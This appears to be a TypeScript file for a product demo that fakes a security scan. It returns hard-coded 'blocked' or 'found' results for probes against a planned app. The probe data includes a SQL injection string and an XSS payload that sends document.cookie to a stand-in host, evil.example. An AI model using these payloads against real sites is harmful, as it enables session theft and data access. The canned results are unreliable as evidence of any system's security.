import type { Plan } from "./plan";

/** Simulated attack run for the /demo flow. No requests leave the browser's own mock API. */
export type Probe = {
  id: string;
  name: string;
  target: string;
  payload: string;
  outcome: "blocked" | "found";
  detail: string;
};

export type AttackResult = { probes: Probe[]; grade: "A" | "B" };

export function runAttack(plan: Plan, hardened: boolean): AttackResult {
  const main = plan.entities[0] ?? "Records";
  const has = (key: string) => plan.features.some((f) => f.key === key);
  const blocked = (probe: Omit<Probe, "outcome">): Probe => ({ ...probe, outcome: "blocked" });

  const probes: Probe[] = [
    blocked({
      id: "sql-injection",
      name: "SQL injection",
      target: `/${main.toLowerCase()}?search=`,
      payload: "' OR 1=1 --",
      detail: "Queries are parameterised; the payload was treated as text.",
    }),
    blocked({
      id: "xss",
      name: "Stored cross-site scripting",
      target: `New ${main.toLowerCase().replace(/s$/, "")} form`,
      payload: "<img src=x onerror=\"fetch('//evil.example?c='+document.cookie)\">",
      detail: "Output is escaped and cookies are HttpOnly.",
    }),
    blocked({
      id: "idor",
      name: "Read another user's data",
      target: `/api/${main.toLowerCase()}/<someone-else's id>`,
      payload: "Swap the record id in the URL",
      detail: "Row-level security returns nothing for records you do not own.",
    }),
    blocked({
      id: "secret-leak",
      name: "Secrets in the browser bundle",
      target: "/_next/static/**/*.js",
      payload: "Scan for service keys and tokens",
      detail: "No server secrets found in client code.",
    }),
    ...(has("payments")
      ? [
          blocked({
            id: "payment-tamper",
            name: "Payment amount tampering",
            target: "/checkout",
            payload: '{"amount": 1}',
            detail: "The server recomputes the price; the client amount is ignored.",
          }),
        ]
      : []),
    ...(has("uploads")
      ? [
          blocked({
            id: "upload",
            name: "Malicious file upload",
            target: "/upload",
            payload: "invoice.pdf.html",
            detail: "File type is checked by content and served from a separate domain.",
          }),
        ]
      : []),
  ];

  const weakSpot: Omit<Probe, "outcome"> = has("auth")
    ? {
        id: "credential-stuffing",
        name: "Credential stuffing on sign-in",
        target: "/sign-in",
        payload: "500 leaked passwords in 60 seconds",
        detail: hardened
          ? "Rate limit and lockout stop the run after 5 attempts."
          : "Every attempt was answered. Add a rate limit and lockout.",
      }
    : {
        id: "form-spam",
        name: "Automated form spam",
        target: `New ${main.toLowerCase().replace(/s$/, "")} form`,
        payload: "1,000 submissions in 60 seconds",
        detail: hardened
          ? "Rate limit and bot check reject the flood after 10 submissions."
          : "Every submission was saved. Add a rate limit and a bot check.",
      };
  probes.push({ ...weakSpot, outcome: hardened ? "blocked" : "found" });

  return { probes, grade: hardened ? "A" : "B" };
}
